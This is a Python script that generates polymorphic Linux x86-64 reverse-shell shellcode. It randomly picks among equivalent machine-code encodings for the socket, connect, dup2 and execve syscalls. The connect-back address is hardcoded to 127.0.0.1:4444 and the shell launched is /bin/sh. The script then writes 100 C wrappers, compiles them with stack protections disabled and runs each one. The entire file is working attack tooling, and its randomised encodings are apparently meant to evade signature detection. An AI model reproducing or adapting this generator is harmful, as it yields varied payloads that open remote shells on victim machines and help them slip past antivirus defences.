import random
import os
import subprocess


# IP : 127.0.0.1
# PORT : 4444


# RAX manipulation
# "4831c0" : xor rax, rax
# "b0012c01" : mov al, 0x1 | sub al, 0x1
# "b001fec8" : mov al, 0x1 | dec al
put_null_in_rax = ["4831c0", "b0012c01", "b001fec8"]

# "6a2958" : push 0x29 | pop rax
# "b029" : mov al, 0x29
# "b028fec0" : mov al, 0x28 | inc al
put_41_in_rax = ["6a2958", "b029", "b028fec0"]

# "6a2a58" : push 0x2A | pop rax
# "b02a" : mov al, 0x2a
# "b02bfec8" : mov al, 0x2b | dec al
put_42_in_rax = ["6a2a58", "b02a", "b02bfec8"]

# "6a2158" : push 0x21 | pop rax
# "4831c0b021" : xor rax, rax | mov al, 0x21
put_33_in_rax = ["6a2158", "4831c0b021"]

# "b03b" : mov al, 59
# "6a3b58" : push 0x3b | pop rax
# "b03cfec8" : mov al, 0x3c | dec al
put_59_in_rax = ["b03b", "6a3b58", "b03cfec8"]


# RDI manipulation
# "4831ff" : xor rdi, rdi
# "40b7014080ef01" : mov dil, 0x1 | sub dil, 0x1
# "40b70140fecf" : mov dil, 0x1 | dec dil
put_null_in_rdi = ["4831ff", "40b7014080ef01", "40b70140fecf"]

# "6a025f" : push 0x2 | pop rdi
# "40b702" : mov dil, 0x2
# "40b70140fec7" : mov dil, 0x1 | inc dil
put_2_in_rdi = ["6a025f", "40b702", "40b70140fec7"]

# "4889c7" : mov rdi, rax
# "505f" : push rax | pop rdi
mov_rax_in_rdi = ["4889c7", "505f"]

# 0 : mov rdi,0x68732f2f6e69622f
put_binsh_on_rdi = ["48bf2f62696e2f2f7368"]

# 0 : push rdi
put_rdi_on_stack = ["57"]

# "545f" push rsp | pop rdi
# "4889e7" : mov rdi, rsp
put_rsp_in_rdi = ["545f", "4889e7"]


# RSI manipulation
# "4831f6" : xor rsi, rsi
# "40b60140fece" : mov sil, 0x1 | dec sil
# "40b6014080ee01" : mov sil, 0x1 | sub sil, 0x1
put_null_in_rsi = ["4831f6", "40b60140fece", "40b6014080ee01"]

# "6a015e" : push 0x1 | pop rsi
# "4831f648ffc6" : xor rsi, rsi | inc rsi
# "4831f640b60240fece" : xor rsi, rsi | mov sil, 0x2 | dec sil
# "48c7c6222222224881ee101111114881ee11111111" : mov rsi, 0x22222222 | sub rsi, 0x11111110 | sub rsi, 0x11111111
put_1_in_rsi = ["6a015e", "4831f648ffc6", "4831f640b60240fece", "48c7c6222222224881ee101111114881ee11111111"]

# "545e" : push rsp | pop rsi
# "4889e6" : mov rsi, rsp
put_rsp_in_rsi = ["545e", "4889e6"]

# "6a025e" : push 0x2 | pop rsi
# "40b602" : mov sil, 0x2
# "40b60140fec6" : mov sil, 0x1 | inc sil
put_2_in_rsi = ["6a025e", "40b602", "40b60140fec6"]

# 0 : push rsi
put_rsi_on_stack = ["56"]

# RDX manipulation
# "4831d2" : xor rdx, rdx
# "4829d2" : sub rdx, rdx
put_null_in_rdx = ["4831d2", "4829d2"]

# "6a105a" : push 0x10 | pop rdx
# "b210" : mov dl, 0x10
# "b20980c207" : mov dl, 0x9 | add dl, 0x7
put_16_in_rdx = ["6a105a", "b210", "b20980c207"]


# R15D manipulation
# 0 : mov r15d, 0x1011116e | xor r15d, 0x11111111
calculate_IP_in_r15d = ["41bf6e1111104181f711111111"]


# RSP manipulation
# 0 : mov dword [rsp + 4], r15d
put_r15d_in_rsp4 = ["44897c2404"]

# 0 : mov word [rsp + 2], 0x5c11
put_4444_in_rsp2 = ["66c7442402115c"]

# 0 : mov byte [rsp], 0x2
put_2_in_rsp = ["c6042402"]

# 0 : push rsp
put_rsp_on_stack = ["54"]


# SYSCALL
# 0 : syscall
syscall = ["0f05"]


# sys_socket
def sys_socket_generator():
    result = ""
    instruction_list = [
        put_null_in_rax,
        put_null_in_rdi,
        put_null_in_rsi,
        put_null_in_rdx,
        put_41_in_rax,
        put_2_in_rdi,
        put_1_in_rsi,
        put_null_in_rdx,
        syscall,
        put_null_in_rdi,
        mov_rax_in_rdi,
    ]

    rnd1 = [
        put_null_in_rax,
        put_null_in_rdi,
        put_null_in_rsi,
        put_null_in_rdx,
        put_null_in_rdx,
    ]
    rnd2 = [
        put_41_in_rax,
        put_2_in_rdi,
        put_1_in_rsi,
        put_null_in_rdx,
        ]
    
    rnd3 = [syscall]

    rnd4 = [
        put_null_in_rdi,
        mov_rax_in_rdi,
        ]
    rnd5 = [
        put_null_in_rdi,
        mov_rax_in_rdi,
    ]
    
    full = [
        rnd1,
        rnd2,
        rnd3,
        rnd4,
        rnd5
    ]

    for instruction_list in full:
        for instruction in instruction_list:
            instruction_len = len(instruction)
            selected_inst = instruction[random.randint(0,instruction_len-1)]
            result = result + selected_inst
    
    return result


# sys_connect
def sys_connect_generator():
    result = ""
    instruction_list = [
        put_null_in_rsi,
        put_rsi_on_stack,
        put_42_in_rax,
        calculate_IP_in_r15d,
        put_r15d_in_rsp4,
        put_4444_in_rsp2,
        put_2_in_rsp,
        put_rsp_in_rsi,
        put_16_in_rdx,
        syscall,
    ]

    rnd1 = [put_null_in_rsi]
    rnd2 = [put_rsi_on_stack]
    rnd3 = [
        put_42_in_rax,
        calculate_IP_in_r15d,
    ]
    rnd4 = [
        put_r15d_in_rsp4,
        put_4444_in_rsp2,
        put_2_in_rsp,
    ]
    rnd5 = [
        put_rsp_in_rsi,
        put_16_in_rdx,
    ]
    rnd6 = [syscall]
    
    full = [
        rnd1,
        rnd2,
        rnd3,
        rnd4,
        rnd5,
        rnd6,
    ]

    for instruction_list in full:
        for instruction in instruction_list:
            instruction_len = len(instruction)
            selected_inst = instruction[random.randint(0,instruction_len-1)]
            result = result + selected_inst
    
    return result

# dup2
def dup2_generator():
    result = ""
    instruction_list = [
        put_33_in_rax,
        put_2_in_rsi,
        syscall,
        put_33_in_rax,
        put_1_in_rsi,
        syscall,
        put_33_in_rax,
        put_null_in_rsi,
        syscall,
    ]

    rnd1 = [
        put_33_in_rax,
        put_2_in_rsi,
    ]
    rnd2 = [syscall]
    rnd3 = [
        put_33_in_rax,
        put_1_in_rsi,
    ]
    rnd4 = [syscall]
    rnd5 = [
        put_33_in_rax,
        put_null_in_rsi,
    ]
    rnd6 = [syscall]
    
    full = [
        rnd1,
        rnd2,
        rnd3,
        rnd4,
        rnd5,
        rnd6
    ]

    for instruction_list in full:
        for instruction in instruction_list:
            instruction_len = len(instruction)
            selected_inst = instruction[random.randint(0,instruction_len-1)]
            result = result + selected_inst

    return result
    

# execve
def execve_generator():
    result = ""
    instruction_list = [
        put_null_in_rsi,
        put_rsi_on_stack,
        put_null_in_rdx,
        put_binsh_on_rdi,
        put_rdi_on_stack,
        put_rsp_in_rdi,
        put_null_in_rax,
        put_59_in_rax,
        syscall
    ]

    rnd1 = [put_null_in_rsi]
    rnd2 = [put_rsi_on_stack]
    rnd3 = [
        put_null_in_rdx,
        put_binsh_on_rdi]
    rnd4 = [put_rdi_on_stack] 
    rnd5 = [put_rsp_in_rdi]
    rnd6 = [put_null_in_rax]
    rnd7 = [put_59_in_rax]
    rnd8 = [syscall]

    full = [
        rnd1,
        rnd2,
        rnd3,
        rnd4,
        rnd5,
        rnd6,
        rnd7,
        rnd8
    ]

    for instruction_list in full:
        for instruction in instruction_list:
            instruction_len = len(instruction)
            selected_inst = instruction[random.randint(0,instruction_len-1)]
            result = result + selected_inst

    return result


def check_path ():
    path = os.path.join(os.getcwd(), "output")
    if not os.path.isdir(path) :
        os.mkdir(os.path.join(os.getcwd(), "output"))
    else:
        for file in path:
            if os.path.isfile(file):
                os.remove(os.path.join(path, file))

    path = os.path.join(os.getcwd(), "output", "compiled")
    if not os.path.isdir(path):
        os.mkdir(os.path.join(os.getcwd(), "output", "compiled"))
    else:
        for file in path:
            if os.path.isfile(file):
                os.remove(os.path.join(path, file))

def generate_reverse_shell():
    for i in range(0, 100):
        result ="{}{}{}{}".format(sys_socket_generator(),sys_connect_generator(),dup2_generator(),execve_generator())
        result = '\\x' + result
        shellcode = '\\x'.join(result[i:i+2] for i in range(0, len(result), 2))
        c_code = '''
    #include <stdio.h>
    int main() {{
        const char shellcode[] = "{}";
        (*(void(*)())shellcode)();
    }}
    '''.format(shellcode[2:])
        f = open("./output/output{}.c".format(i), "w")
        f.write(c_code)
        f.close()

    directory = "./output"
    for filename in os.listdir(directory):
        f = os.path.join(directory, filename)
        if os.path.isfile(f):
            compile = "gcc {}{} -o {}{} -fno-stack-protector -z execstack".format("./output/", filename, "./output/compiled/", filename[:-2])
            result = subprocess.check_output(compile, shell=True)


def compilator():
    directory = "./output/compiled"
    for filename in os.listdir(directory):
        f = os.path.join(directory, filename)
        if os.path.isfile(f):
            try:
                result = subprocess.check_output(f, shell=True, timeout=2)
            except subprocess.SubprocessError as e:
                print(filename)
                if (e == subprocess.TimeoutExpired):
                    print ("Timeout")
                    pass
                else:
                    print(type(e))
                print("---------------------------------")


check_path()
generate_reverse_shell()
compilator()